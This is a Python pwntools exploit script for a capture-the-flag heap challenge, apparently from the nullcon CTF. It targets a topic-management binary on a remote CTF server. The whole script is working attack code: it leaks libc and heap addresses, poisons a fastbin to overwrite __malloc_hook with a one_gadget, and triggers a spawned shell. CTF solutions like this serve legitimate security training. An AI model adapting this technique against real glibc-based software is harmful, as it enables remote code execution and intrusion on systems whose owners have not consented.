#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./challenge",
	"libc" : "/lib/x86_64-linux-gnu/libc-2.23.so",
	"HOST" : "pwn.ctf.nullcon.net",
	"PORT" : 4003
}

def create(topic):
	r.sendlineafter('> ', "1")
	r.sendlineafter('topic: ', topic)

def set_desc(topic, dlen, desc):
	r.sendlineafter('> ', "2")
	r.sendlineafter('topic: ', topic)
	r.sendlineafter('Desc length: ', str(dlen))
	r.sendlineafter('Desc: ', desc)

def delete(topic):
	r.sendlineafter('> ', "3")
	r.sendlineafter('topic: ', topic)

def view():
	r.sendlineafter('> ', "4")
	d = {}
	while True:
		s = r.recvline()
		res = s.split(" - ")
		if len(res) == 1:
			break
		[a, b] = res
		d[a] = b[:-1]
	return d

def exploit(r):

	# leak libc
	create("A"*8+p64(e.got["malloc"]))
	delete("A"*8+p64(e.got["malloc"]))

	create("B"*0x20)
	create("C"*0x20)
	libc_base = u64(view()["C"*0x20].ljust(8, '\x00'))-libc.symbols["malloc"]
	log.info("libc_base : 0x{:x}".format(libc_base))
	delete("B"*0x20)

	# leak heap
	create("A"*8+p64(0x602040))
	delete("A"*8+p64(0x602040))

	create("B"*0x20)
	create("C"*0x20)
	heap_leak= u64(view()["C"*0x20].ljust(8, '\x00'))
	log.info("heap_leak: 0x{:x}".format(heap_leak))
	delete("B"*0x20)

	# setup fastbin atk
	create("A"*8+p64(heap_leak+0x140))
	delete("A"*8+p64(heap_leak+0x140))

	create("B"*0x20)
	create("D"*0x20)
	delete("B"*0x20)

	create("X")
	set_desc("X", 0x70-0x10, "xxxx")
	create("Y")
	set_desc("Y", 0x70-0x10, "yyyy")

	# fastbin attack on malloc_hook
	one_gadget = libc_base + 0x45216

	delete("X")
	delete("Y")
	set_desc("D"*0x20, 0x70-0x10, p64(libc_base+0x3c4aed))
	create("W"*(0x70-0x10))
	create("lets get it".ljust(0x70-0x10))

	set_desc("lets get it".ljust(0x70-0x10), 0x70-0x10, "A"*3+p64(0)*2+p64(one_gadget))

	# trigger
	create("/bin/sh")

	r.interactive()
	return

if __name__ == "__main__":
	
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if sys.argv[-1] == "remote":
		r = remote(config["HOST"], config["PORT"])
		exploit(r)
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
